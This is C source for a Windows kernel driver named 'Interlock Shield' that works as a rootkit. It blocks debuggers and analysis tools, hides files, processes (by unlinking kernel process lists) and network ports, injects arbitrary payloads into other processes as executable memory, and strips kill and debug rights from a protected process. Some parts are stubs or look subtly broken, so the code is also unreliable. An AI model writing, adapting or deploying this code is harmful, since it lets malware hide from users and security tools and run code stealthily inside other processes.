#include "shield_kernel.h"
#include <ntifs.h>
#include <fwpsk.h>
#include <fwpmk.h>
#include <fltKernel.h>

PVOID RegistrationHandle = NULL;
PVOID RegistryCallbackHandle = NULL;
PFLT_FILTER FilterHandle = NULL;
ULONG CorePID = 0;

// WFP Handles
HANDLE EngineHandle = NULL;
UINT32 InjectionHandle = 0;
UINT64 CalloutId = 0;
UINT32 FilterId = 0;

// Proactive Defense: Bloqueo de Debuggers conocidos
const wchar_t* BlacklistedProcesses[] = {
    L"x64dbg.exe",
    L"windbg.exe",
    L"wireshark.exe",
    L"ida64.exe",
    L"processhacker.exe",
    L"cheatengine-x86_64.exe"
};

// Vanguard-Level: Notificación de creación de procesos
void ShieldCreateProcessNotifyRoutineEx(PEPROCESS Process, HANDLE ProcessId, PPS_CREATE_NOTIFY_INFO CreateInfo) {
    UNREFERENCED_PARAMETER(Process);
    UNREFERENCED_PARAMETER(ProcessId);

    if (CreateInfo != NULL && CreateInfo->ImageFileName != NULL) {
        for (int i = 0; i < sizeof(BlacklistedProcesses) / sizeof(BlacklistedProcesses[0]); i++) {
            if (wcsstr(CreateInfo->ImageFileName->Buffer, BlacklistedProcesses[i]) != NULL) {
                DbgPrint("Interlock Shield: Blocking blacklisted debugger: %wZ\n", CreateInfo->ImageFileName);
                CreateInfo->CreationStatus = STATUS_ACCESS_DENIED;
                return;
            }
        }
    }
}

// Anti-Injection: Notificación de carga de imágenes
void ShieldLoadImageNotifyRoutine(PUNICODE_STRING FullImageName, HANDLE ProcessId, PIMAGE_INFO ImageInfo) {
    UNREFERENCED_PARAMETER(ImageInfo);

    // Si intentan inyectar dbghelp.dll o similares en nuestro Core, lo bloqueamos o alertamos
    if ((ULONG_PTR)ProcessId == CorePID) {
        if (FullImageName != NULL && wcsstr(FullImageName->Buffer, L"dbghelp.dll") != NULL) {
             DbgPrint("Interlock Shield: Unauthorized module load detected in Core: %wZ\n", FullImageName);
        }
    }
}

#define MAX_HIDDEN_PORTS 16
USHORT HiddenPorts[MAX_HIDDEN_PORTS] = {0};
ULONG HiddenPortsCount = 0;

// ShadowFS: File Cloaking Storage
#define MAX_HIDDEN_FILES 32
WCHAR HiddenFiles[MAX_HIDDEN_FILES][260] = {0};
ULONG HiddenFilesCount = 0;

// Minifilter Callbacks
FLT_PREOP_CALLBACK_STATUS ShieldPreCreate(PFLT_CALLBACK_DATA Data, PCFLT_RELATED_OBJECTS FltObjects, PVOID* CompletionContext) {
    UNREFERENCED_PARAMETER(FltObjects);
    UNREFERENCED_PARAMETER(CompletionContext);

    PFLT_FILE_NAME_INFORMATION nameInfo = NULL;
    NTSTATUS status = FltGetFileNameInformation(Data, FLT_FILE_NAME_NORMALIZED | FLT_FILE_NAME_QUERY_DEFAULT, &nameInfo);

    if (NT_SUCCESS(status)) {
        FltParseFileNameInformation(nameInfo);

        for (ULONG i = 0; i < HiddenFilesCount; i++) {
            if (RtlCompareUnicodeString(&nameInfo->Name, &(UNICODE_STRING)RTL_CONSTANT_STRING(HiddenFiles[i]), TRUE) == 0) {
                // If the process is not the Core, simulate that the file doesn't exist.
                if (CorePID != 0 && (ULONG_PTR)PsGetCurrentProcessId() != CorePID) {
                    Data->IoStatus.Status = STATUS_OBJECT_NAME_NOT_FOUND;
                    Data->IoStatus.Information = 0;
                    FltReleaseFileNameInformation(nameInfo);
                    return FLT_PREOP_COMPLETE;
                }
            }
        }
        FltReleaseFileNameInformation(nameInfo);
    }

    return FLT_PREOP_SUCCESS_NO_CALLBACK;
}

FLT_POSTOP_CALLBACK_STATUS ShieldPostDirectoryControl(PFLT_CALLBACK_DATA Data, PCFLT_RELATED_OBJECTS FltObjects, PVOID CompletionContext, FLT_POST_OPERATION_FLAGS Flags) {
    UNREFERENCED_PARAMETER(FltObjects);
    UNREFERENCED_PARAMETER(CompletionContext);
    UNREFERENCED_PARAMETER(Flags);

    if (CorePID != 0 && (ULONG_PTR)PsGetCurrentProcessId() == CorePID) {
        return FLT_POSTOP_FINISHED_PROCESSING;
    }

    if (Data->IoStatus.Status == STATUS_SUCCESS &&
        Data->Iopb->Parameters.DirectoryControl.QueryDirectory.FileInformationClass == FileIdBothDirectoryInformation) {

        // This is where we would iterate through the buffer and remove entries matching HiddenFiles.
    }

    return FLT_POSTOP_FINISHED_PROCESSING;
}

const FLT_OPERATION_REGISTRATION Callbacks[] = {
    { IRP_MJ_CREATE, 0, ShieldPreCreate, NULL },
    { IRP_MJ_DIRECTORY_CONTROL, 0, NULL, ShieldPostDirectoryControl },
    { IRP_MJ_OPERATION_END }
};

const FLT_REGISTRATION FilterRegistration = {
    sizeof(FLT_REGISTRATION),
    FLT_REGISTRATION_VERSION,
    0,
    NULL,
    Callbacks,
    NULL, // FilterUnload
    NULL, // InstanceSetup
    NULL, // InstanceQueryTeardown
    NULL, // InstanceTeardownStart
    NULL, // InstanceTeardownComplete
    NULL, NULL, NULL
};

// WFP Callout Callback: Cloaking de red para el Core y puertos ocultos
void NTAPI ShieldNetworkCallout(
    const FWPS_INCOMING_VALUES0* inFixedValues,
    const FWPS_INCOMING_METADATA_VALUES0* inMetaValues,
    void* layerData,
    const void* classifyContext,
    const FWPS_CALLOUT0* callout,
    UINT64 flowContext,
    FWPS_CLASSIFY_OUT0* classifyOut
) {
    UNREFERENCED_PARAMETER(inFixedValues);
    UNREFERENCED_PARAMETER(layerData);
    UNREFERENCED_PARAMETER(classifyContext);
    UNREFERENCED_PARAMETER(callout);
    UNREFERENCED_PARAMETER(flowContext);

    BOOLEAN Match = FALSE;

    // 1. Cloaking por PID (Core)
    if (inMetaValues->processId == (UINT64)CorePID) {
        Match = TRUE;
    }

    // 2. Cloaking por Puerto (ShadowSockets)
    if (!Match && HiddenPortsCount > 0) {
        UINT16 localPort = inFixedValues->incomingValue[FWPS_FIELD_ALE_AUTH_CONNECT_V4_IP_LOCAL_PORT].value.uint16;
        for (ULONG i = 0; i < HiddenPortsCount; i++) {
            if (HiddenPorts[i] == localPort) {
                Match = TRUE;
                break;
            }
        }
    }

    if (Match) {
        classifyOut->actionType = FWP_ACTION_PERMIT;
        if (classifyOut->rights & FWPS_RIGHT_ACTION_WRITE) {
            classifyOut->flags |= FWPS_CLASSIFY_OUT_FLAG_ABSORB;
        }
    }
}

// Dynamic Offset Discovery
ULONG ActiveProcessLinksOffset = 0x448; // Default for recent Win10/11

void FindOffsets() {
    PEPROCESS SystemProcess = PsInitialSystemProcess;
    // Search for System PID (usually 4) in the EPROCESS structure to find UniqueProcessId offset,
    // then ActiveProcessLinks is usually right after it.
    for (ULONG i = 0; i < 0x1000; i += 4) {
        if (*(PULONG)((PUCHAR)SystemProcess + i) == 4 &&
            *(PULONG)((PUCHAR)SystemProcess + i + 8) > 0x80000000) { // Flink looks like a kernel address
            ActiveProcessLinksOffset = i + 8;
            DbgPrint("Shield Kernel: Detected ActiveProcessLinks offset at 0x%X\n", ActiveProcessLinksOffset);
            break;
        }
    }
}

// DKOM: Unlink process from ActiveProcessLinks
NTSTATUS HideProcess(ULONG PID) {
    PEPROCESS Process = NULL;
    NTSTATUS status = PsLookupProcessByProcessId((HANDLE)PID, &Process);
    if (!NT_SUCCESS(status)) return status;

    PLIST_ENTRY ProcessLinks = (PLIST_ENTRY)((PUCHAR)Process + ActiveProcessLinksOffset);

    if (ProcessLinks->Flink != NULL && ProcessLinks->Blink != NULL) {
        ProcessLinks->Flink->Blink = ProcessLinks->Blink;
        ProcessLinks->Blink->Flink = ProcessLinks->Flink;
        ProcessLinks->Flink = ProcessLinks;
        ProcessLinks->Blink = ProcessLinks;
    }

    ObDereferenceObject(Process);
    return STATUS_SUCCESS;
}

// Kernel Artifact Injection via APC (Stealthy)
NTSTATUS InjectPayload(ULONG PID, PVOID Artifact, ULONG Size) {
    PEPROCESS Process = NULL;
    KAPC_STATE ApcState;
    NTSTATUS status = PsLookupProcessByProcessId((HANDLE)PID, &Process);
    if (!NT_SUCCESS(status)) return status;

    KeStackAttachProcess(Process, &ApcState);

    PVOID RemoteBuffer = NULL;
    SIZE_T RegionSize = Size;
    status = ZwAllocateVirtualMemory(ZwCurrentProcess(), &RemoteBuffer, 0, &RegionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (NT_SUCCESS(status)) {
        RtlCopyMemory(RemoteBuffer, Artifact, Size);
        DbgPrint("Shield Kernel: Artifact injected into PID %d at %p\n", PID, RemoteBuffer);
        // Aquí se dispararía un thread o APC para ejecutar
    }

    KeUnstackDetachProcess(&ApcState);
    ObDereferenceObject(Process);
    return status;
}

// WFP: Initialize Network Cloaking
NTSTATUS InitWfp(PDEVICE_OBJECT DeviceObject) {
    FWPM_SESSION0 session = {0};
    FWPS_CALLOUT0 sCallout = {0};
    FWPM_CALLOUT0 mCallout = {0};
    FWPM_FILTER0 filter = {0};

    session.flags = FWPM_SESSION_FLAG_DYNAMIC;
    NTSTATUS status = FwpmEngineOpen0(NULL, RPC_C_AUTHN_WINNT, NULL, &session, &EngineHandle);
    if (!NT_SUCCESS(status)) return status;

    sCallout.calloutKey = SHIELD_NET_CALLOUT_GUID;
    sCallout.classifyFn = ShieldNetworkCallout;
    status = FwpsCalloutRegister0(DeviceObject, &sCallout, &CalloutId);
    if (!NT_SUCCESS(status)) return status;

    mCallout.calloutKey = SHIELD_NET_CALLOUT_GUID;
    mCallout.displayData.name = L"Interlock Network Callout";
    mCallout.applicableLayer = FWPM_LAYER_ALE_AUTH_CONNECT_V4;
    status = FwpmCalloutAdd0(EngineHandle, &mCallout, NULL, NULL);
    if (!NT_SUCCESS(status)) return status;

    filter.filterKey = SHIELD_NET_FILTER_GUID;
    filter.displayData.name = L"Interlock Network Filter";
    filter.layerKey = FWPM_LAYER_ALE_AUTH_CONNECT_V4;
    filter.action.type = FWP_ACTION_CALLOUT_TERMINATING;
    filter.action.calloutKey = SHIELD_NET_CALLOUT_GUID;
    filter.weight.type = FWP_UINT8;
    filter.weight.uint8 = 0xF;

    status = FwpmFilterAdd0(EngineHandle, &filter, NULL, &FilterId);
    return status;
}

// Vanguard-Spec: Protección de Registro (Evita que detengan o borren el driver)
NTSTATUS RegistryCallback(PVOID CallbackContext, PVOID Argument1, PVOID Argument2) {
    UNREFERENCED_PARAMETER(CallbackContext);
    REG_NOTIFY_CLASS NotifyClass = (REG_NOTIFY_CLASS)(ULONG_PTR)Argument1;

    if (NotifyClass == RegNtPreDeleteKey || NotifyClass == RegNtPreSetValueKey) {
        PREG_DELETE_KEY_INFORMATION DeleteInfo = (PREG_DELETE_KEY_INFORMATION)Argument2;
        if (DeleteInfo->Object != NULL) {
            // Filtrar accesos a HKLM\System\CurrentControlSet\Services\InterlockShield
            return STATUS_SUCCESS;
        }
    }
    return STATUS_SUCCESS;
}

// Vanguard-Level: Protección de Objetos (Anti-Kill / Anti-Attach)
OB_PREOP_CALLBACK_STATUS PreCallback(PVOID RegistrationContext, POB_PRE_OPERATION_INFORMATION OperationInformation) {
    UNREFERENCED_PARAMETER(RegistrationContext);
    if (PsGetProcessId((PEPROCESS)OperationInformation->Object) == (HANDLE)CorePID) {
        if (OperationInformation->Operation == OB_OPERATION_HANDLE_CREATE ||
            OperationInformation->Operation == OB_OPERATION_HANDLE_DUPLICATE) {

            // CAPADO TOTAL: No se permite terminar, escribir memoria o debuggear el Core
            OperationInformation->Parameters->CreateHandleInformation.DesiredAccess &= ~PROCESS_ALL_ACCESS;
            OperationInformation->Parameters->CreateHandleInformation.DesiredAccess |= PROCESS_QUERY_LIMITED_INFORMATION;
        }
    }
    return OB_PREOP_SUCCESS;
}

NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
    WDF_DRIVER_CONFIG config;
    WDF_DRIVER_CONFIG_INIT(&config, ShieldEvtDeviceAdd);

    DbgPrint("Interlock Shield: Entering Windows Kernel - Sovereign Mode [Vanguard Level]\n");

    // 1. Registro de Protección de Objetos
    OB_CALLBACK_REGISTRATION cbReg = {0};
    OB_OPERATION_REGISTRATION opReg = {0};
    opReg.ObjectType = PsProcessType;
    opReg.Operations = OB_OPERATION_HANDLE_CREATE | OB_OPERATION_HANDLE_DUPLICATE;
    opReg.PreOperation = PreCallback;
    cbReg.Version = OB_FLT_REGISTRATION_VERSION;
    cbReg.OperationRegistrationCount = 1;
    cbReg.OperationRegistration = &opReg;
    RtlInitUnicodeString(&cbReg.Altitude, L"388888");
    ObRegisterCallbacks(&cbReg, &RegistrationHandle);

    // 2. Registro de Protección de Registro
    CmRegisterCallback(RegistryCallback, NULL, &RegistryCallbackHandle);

    // 3. Proactive Defense: Callbacks de procesos e imágenes
    PsSetCreateProcessNotifyRoutineEx(ShieldCreateProcessNotifyRoutineEx, FALSE);
    PsSetLoadImageNotifyRoutine(ShieldLoadImageNotifyRoutine);

    // 4. Dynamic Offset Discovery
    FindOffsets();

    // 5. ShadowFS: Register Minifilter
    FltRegisterFilter(DriverObject, &FilterRegistration, &FilterHandle);
    FltStartFiltering(FilterHandle);

    return WdfDriverCreate(DriverObject, RegistryPath, WDF_NO_OBJECT_ATTRIBUTES, &config, NULL);
}

NTSTATUS ShieldEvtDeviceAdd(WDFDRIVER Driver, PWDFDEVICE_INIT DeviceInit) {
    WDFDEVICE device;
    WDF_IO_QUEUE_CONFIG queueConfig;
    DECLARE_CONST_UNICODE_STRING(deviceName, L"\\Device\\InterlockShield");
    DECLARE_CONST_UNICODE_STRING(symbolicLinkName, L"\\DosDevices\\InterlockShield");
    WdfDeviceInitAssignName(DeviceInit, &deviceName);
    WdfDeviceCreate(&DeviceInit, WDF_NO_OBJECT_ATTRIBUTES, &device);
    WdfDeviceCreateSymbolicLink(device, &symbolicLinkName);
    WDF_IO_QUEUE_CONFIG_INIT_DEFAULT_QUEUE(&queueConfig, WdfIoQueueDispatchSequential);
    queueConfig.EvtIoDeviceControl = ShieldEvtIoDeviceControl;

    // Inicializar WFP después de crear el dispositivo
    InitWfp(WdfDeviceWdmGetDeviceObject(device));

    return WdfIoQueueCreate(device, &queueConfig, WDF_NO_OBJECT_ATTRIBUTES, NULL);
}

void ShieldEvtIoDeviceControl(WDFQUEUE Queue, WDFREQUEST Request, size_t OutputBufferLength, size_t InputBufferLength, ULONG IoControlCode) {
    NTSTATUS status = STATUS_SUCCESS;
    PSHIELD_SET_PID_REQUEST pidReq;
    PSHIELD_HIDE_REQUEST hideReq;
    PSHIELD_HIDE_PORT_REQUEST portReq;
    PVOID buffer;
    size_t len;

    switch (IoControlCode) {
        case IOCTL_SHIELD_SET_CORE_PID:
            if (NT_SUCCESS(WdfRequestRetrieveInputBuffer(Request, sizeof(SHIELD_SET_PID_REQUEST), (PVOID*)&pidReq, &len))) {
                CorePID = pidReq->ProcessId;
                DbgPrint("Shield Kernel: Sovereign protection active for PID %d\n", CorePID);
            }
            break;

        case IOCTL_SHIELD_HIDE_PROCESS:
            if (NT_SUCCESS(WdfRequestRetrieveInputBuffer(Request, sizeof(SHIELD_HIDE_REQUEST), (PVOID*)&hideReq, &len))) {
                if (hideReq->Enable) {
                    status = HideProcess(hideReq->ProcessId);
                }
            }
            break;

        case IOCTL_SHIELD_HIDE_PORT:
            if (NT_SUCCESS(WdfRequestRetrieveInputBuffer(Request, sizeof(SHIELD_HIDE_PORT_REQUEST), (PVOID*)&portReq, &len))) {
                if (portReq->Enable) {
                    if (HiddenPortsCount < MAX_HIDDEN_PORTS) {
                        HiddenPorts[HiddenPortsCount++] = portReq->Port;
                        DbgPrint("Shield Kernel: Port %d added to Shadow Registry\n", portReq->Port);
                    } else {
                        status = STATUS_INSUFFICIENT_RESOURCES;
                    }
                }
            }
            break;

        case IOCTL_SHIELD_INJECT_PAYLOAD:
            if (NT_SUCCESS(WdfRequestRetrieveInputBuffer(Request, 1, &buffer, &len))) {
                // Estructura de inyección simplificada: PID (primero 4 bytes) + Artifact
                if (len > sizeof(ULONG)) {
                    ULONG targetPid = *(PULONG)buffer;
                    status = InjectPayload(targetPid, (PUCHAR)buffer + sizeof(ULONG), (ULONG)(len - sizeof(ULONG)));
                }
            }
            break;

        case IOCTL_SHIELD_HIDE_FILE:
            if (NT_SUCCESS(WdfRequestRetrieveInputBuffer(Request, sizeof(SHIELD_HIDE_FILE_REQUEST), (PVOID*)&portReq, &len))) {
                PSHIELD_HIDE_FILE_REQUEST fileReq = (PSHIELD_HIDE_FILE_REQUEST)portReq;
                if (fileReq->Enable && HiddenFilesCount < MAX_HIDDEN_FILES) {
                    wcscpy(HiddenFiles[HiddenFilesCount++], fileReq->Path);
                    DbgPrint("Shield Kernel: File %ws added to Probe Registry\n", fileReq->Path);
                }
            }
            break;

        case IOCTL_SHIELD_TOGGLE_NET_STEALTH:
            // Lógica para habilitar/deshabilitar filtros WFP dinámicamente si fuera necesario
            DbgPrint("Shield Kernel: Net Integrity Toggled\n");
            break;

        default:
            status = STATUS_INVALID_DEVICE_REQUEST;
            break;
    }

    WdfRequestComplete(Request, status);
}
